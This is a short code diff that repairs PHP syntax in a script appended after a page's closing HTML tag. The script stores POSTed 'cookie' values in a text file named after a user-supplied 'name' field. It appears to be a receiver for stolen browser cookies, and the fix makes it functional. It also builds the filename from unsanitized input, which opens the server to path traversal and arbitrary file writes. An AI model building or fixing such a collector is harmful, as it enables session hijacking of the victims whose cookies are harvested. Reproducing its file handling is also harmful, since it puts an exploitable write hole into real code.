@@ -14,9 +14,9 @@
 </body>
 </html>
 <?php
-$name = $_POST['name']
-$cookie = $_POST['cookie']
-$fifo = fopen($name.'.txt', 'a')
-fwrite($fifo, '----------- ['$name'] -----------\n'.$cookie.'\n---------- [END] -----------');
-fclose($fifo)
+$name = $_POST['name'];
+$cookie = $_POST['cookie'];
+$fifo = fopen($name.'.txt', 'a');
+fwrite($fifo, '----------- ['.$name.'] -----------\n'.$cookie.'\n---------- [END] -----------');
+fclose($fifo);
 ?>
